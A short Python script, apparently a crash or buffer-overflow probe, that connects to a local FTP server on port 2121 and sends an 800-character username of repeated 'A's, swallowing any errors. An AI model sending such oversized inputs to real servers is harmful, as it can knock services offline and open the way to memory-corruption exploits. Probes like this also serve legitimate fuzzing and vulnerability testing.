import ftplib
from ftplib import FTP

if __name__ == '__main__':
	ftp = FTP()
	ftp.connect('127.0.0.1', 2121)
	try:
		ftp.login('A' * 800, 'aaa')
		ftp.close()
	except ftplib.all_errors:
		pass